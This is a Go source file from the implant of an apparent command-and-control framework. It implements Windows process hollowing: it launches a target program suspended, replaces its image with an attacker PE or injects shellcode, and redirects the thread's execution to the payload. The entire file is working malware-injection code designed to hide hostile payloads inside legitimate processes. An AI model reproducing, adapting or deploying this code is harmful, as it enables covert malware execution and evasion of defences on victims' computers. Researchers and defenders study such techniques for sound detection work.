//go:build windows

package inject

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// ─── Thread CONTEXT wrapper (AMD64, 1232 bytes, 16-byte aligned) ─────────────

type x64Context struct {
	buf [1232 + 16]byte
	ptr uintptr
}

func newContext() *x64Context {
	c := &x64Context{}
	addr := uintptr(unsafe.Pointer(&c.buf[0]))
	if addr&15 != 0 {
		addr = (addr + 15) &^ 15
	}
	c.ptr = addr
	return c
}

func (c *x64Context) raw() uintptr                { return c.ptr }
func (c *x64Context) setContextFlags(f uint32)    { *(*uint32)(unsafe.Pointer(c.ptr + 48)) = f }
func (c *x64Context) setRip(v uint64)             { *(*uint64)(unsafe.Pointer(c.ptr + 248)) = v }

const contextAll uint32 = 0x0010001F

type processBasicInfo struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

// HollowProcess selects the appropriate technique based on the payload:
//   - MZ header → true PE hollowing
//   - otherwise → shellcode RIP-redirect
func HollowProcess(exe string, payload []byte) error {
	if len(payload) >= 2 && payload[0] == 0x4D && payload[1] == 0x5A {
		return hollowPE(exe, payload)
	}
	return hollowShellcode(exe, payload)
}

func hollowPE(exe string, payload []byte) error {
	if len(payload) < 0x40 {
		return fmt.Errorf("hollow: payload too small")
	}

	if binary.LittleEndian.Uint16(payload[0:2]) != 0x5A4D {
		return fmt.Errorf("hollow: invalid MZ signature in payload")
	}
	peOff := binary.LittleEndian.Uint32(payload[0x3C:])
	if binary.LittleEndian.Uint32(payload[peOff:]) != 0x00004550 {
		return fmt.Errorf("hollow: invalid PE signature")
	}
	if binary.LittleEndian.Uint16(payload[peOff+4:]) != 0x8664 {
		return fmt.Errorf("hollow: only AMD64 PE supported")
	}

	optOff := peOff + 24
	if binary.LittleEndian.Uint16(payload[optOff:]) != 0x020B {
		return fmt.Errorf("hollow: only PE32+ supported")
	}

	numSections := binary.LittleEndian.Uint16(payload[peOff+6:])
	imageBase := binary.LittleEndian.Uint64(payload[optOff+24:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOff+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOff+60:])
	entryPointRVA := binary.LittleEndian.Uint32(payload[optOff+16:])
	relocRVA := binary.LittleEndian.Uint32(payload[optOff+128:])
	relocSize := binary.LittleEndian.Uint32(payload[optOff+132:])
	secTableOff := uint32(optOff) + 240

	exeW, err := windows.UTF16PtrFromString(exe)
	if err != nil {
		return fmt.Errorf("hollow: UTF16Ptr: %w", err)
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	if err := windows.CreateProcess(exeW, nil, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return fmt.Errorf("hollow: CreateProcess(%s): %w", exe, err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	abort := func(msg string, e error) error {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("hollow: %s: %w", msg, e)
	}

	var pbi processBasicInfo
	var retLen uint32
	r, _, _ := winsyscall.ProcNtQueryInformationProcess.Call(
		uintptr(pi.Process), 0,
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 {
		return abort("NtQueryInformationProcess", fmt.Errorf("NTSTATUS 0x%08X", uint32(r)))
	}

	var remoteImageBase uintptr
	if err := windows.ReadProcessMemory(pi.Process,
		pbi.PebBaseAddress+0x10,
		(*byte)(unsafe.Pointer(&remoteImageBase)),
		unsafe.Sizeof(remoteImageBase), nil); err != nil {
		return abort("ReadProcessMemory(PEB.ImageBase)", err)
	}

	winsyscall.ProcNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteImageBase)

	allocBase, err := winsyscall.NtAllocAt(pi.Process, uintptr(imageBase), uintptr(sizeOfImage), winsyscall.PageReadWrite)
	if err != nil {
		return abort("NtAllocateVirtualMemory", err)
	}

	staging := make([]byte, sizeOfImage)
	copy(staging[:sizeOfHeaders], payload[:sizeOfHeaders])

	for i := 0; i < int(numSections); i++ {
		off := secTableOff + uint32(i)*40
		sec := payload[off:]
		virtualAddr := binary.LittleEndian.Uint32(sec[12:])
		rawOff := binary.LittleEndian.Uint32(sec[20:])
		rawSize := binary.LittleEndian.Uint32(sec[16:])
		virtSize := binary.LittleEndian.Uint32(sec[8:])
		if rawSize == 0 {
			continue
		}
		copyLen := rawSize
		if copyLen > virtSize {
			copyLen = virtSize
		}
		copy(staging[virtualAddr:virtualAddr+copyLen], payload[rawOff:rawOff+copyLen])
	}

	delta := int64(allocBase) - int64(imageBase)
	if delta != 0 && relocRVA != 0 && relocSize != 0 {
		hollowApplyRelocs(staging, relocRVA, relocSize, delta)
	}

	var written uintptr
	if err := windows.WriteProcessMemory(pi.Process, allocBase,
		&staging[0], uintptr(sizeOfImage), &written); err != nil {
		return abort("WriteProcessMemory(image)", err)
	}

	windows.WriteProcessMemory(pi.Process, //nolint:errcheck
		pbi.PebBaseAddress+0x10,
		(*byte)(unsafe.Pointer(&allocBase)),
		unsafe.Sizeof(allocBase), nil)

	// Apply per-section memory protections (W^X: no RWX regions in the hollow process).
	for i := 0; i < int(numSections); i++ {
		off := secTableOff + uint32(i)*40
		sec := payload[off:]
		secVA := binary.LittleEndian.Uint32(sec[12:])
		secSize := binary.LittleEndian.Uint32(sec[8:])
		chars := binary.LittleEndian.Uint32(sec[36:])
		if secSize == 0 {
			continue
		}
		if _, err := winsyscall.NtProtect(pi.Process, allocBase+uintptr(secVA), uintptr(secSize), hollowSectionProt(chars)); err != nil {
			return abort(fmt.Sprintf("NtProtect section[%d]", i), err)
		}
	}

	ctx := newContext()
	ctx.setContextFlags(contextAll)
	r, _, e := winsyscall.ProcGetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		return abort("GetThreadContext", fmt.Errorf("%v", e))
	}
	ctx.setRip(uint64(allocBase) + uint64(entryPointRVA))
	r, _, e = winsyscall.ProcSetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		return abort("SetThreadContext", fmt.Errorf("%v", e))
	}

	winsyscall.ProcResumeThread.Call(uintptr(pi.Thread))
	return nil
}

// hollowSectionProt maps PE section characteristics to a W^X-safe page protection.
func hollowSectionProt(chars uint32) uint32 {
	exec := chars&0x20000000 != 0
	write := chars&0x80000000 != 0
	switch {
	case exec:
		return winsyscall.PageExecRead
	case write:
		return winsyscall.PageReadWrite
	default:
		return 0x02 // PAGE_READONLY
	}
}

func hollowApplyRelocs(staging []byte, relocRVA, relocSize uint32, delta int64) {
	off := uintptr(relocRVA)
	end := off + uintptr(relocSize)
	for off < end {
		if int(off+8) > len(staging) {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(staging[off:])
		blockSize := binary.LittleEndian.Uint32(staging[off+4:])
		if blockSize < 8 {
			break
		}
		numEntries := (blockSize - 8) / 2
		for i := uint32(0); i < numEntries; i++ {
			entry := binary.LittleEndian.Uint16(staging[off+8+uintptr(i)*2:])
			if entry>>12 != 10 {
				continue
			}
			patchOff := uintptr(pageRVA) + uintptr(entry&0x0FFF)
			if int(patchOff+8) > len(staging) {
				continue
			}
			old := int64(binary.LittleEndian.Uint64(staging[patchOff:]))
			binary.LittleEndian.PutUint64(staging[patchOff:], uint64(old+delta))
		}
		off += uintptr(blockSize)
	}
}

func hollowShellcode(exe string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	exeW, err := windows.UTF16PtrFromString(exe)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString: %w", err)
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	if err := windows.CreateProcess(exeW, nil, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return fmt.Errorf("CreateProcess(%s): %w", exe, err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	addr, err := winsyscall.NtAlloc(pi.Process, uintptr(len(shellcode)), winsyscall.PageReadWrite)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	var written uintptr
	if err := windows.WriteProcessMemory(pi.Process, addr,
		&shellcode[0], uintptr(len(shellcode)), &written); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}

	if _, err := winsyscall.NtProtect(pi.Process, addr, uintptr(len(shellcode)), winsyscall.PageExecRead); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	ctx := newContext()
	ctx.setContextFlags(contextAll)
	r, _, e := winsyscall.ProcGetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("GetThreadContext: %v", e)
	}
	ctx.setRip(uint64(addr))
	r, _, e = winsyscall.ProcSetThreadContext.Call(uintptr(pi.Thread), ctx.raw())
	if r == 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("SetThreadContext: %v", e)
	}

	winsyscall.ProcResumeThread.Call(uintptr(pi.Thread))
	return nil
}
